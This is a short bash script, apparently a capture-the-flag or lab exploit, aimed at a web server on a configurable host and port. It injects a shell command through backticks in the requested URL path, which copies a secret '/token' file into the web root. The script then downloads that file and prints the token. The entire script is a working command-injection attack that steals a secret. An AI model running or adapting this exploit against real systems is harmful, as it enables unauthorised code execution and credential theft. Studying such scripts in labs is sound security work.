#!/bin/bash

# Check for the environment variables

if [[ -z "${HOST}" ]]; then
  HOST="localhost"
else
  HOST="${HOST}"
fi

if [[ -z "${PORT}" ]]; then
  PORT=3040
else
  PORT="${PORT}"
fi

if [ $# -eq 2 ]
  then
      HOST=$1
      PORT=$2      
fi

echo "Curling from $HOST:$PORT"
OUT="token_leak.txt"

RESULT=$(curl "$HOST:$PORT/indexaa\`cp /token /data/webroot/$OUT\`.html")

sleep 2

TOKEN=$(curl -H "Host: localhost" $HOST:$PORT/$OUT)

echo "TOKEN: $TOKEN"
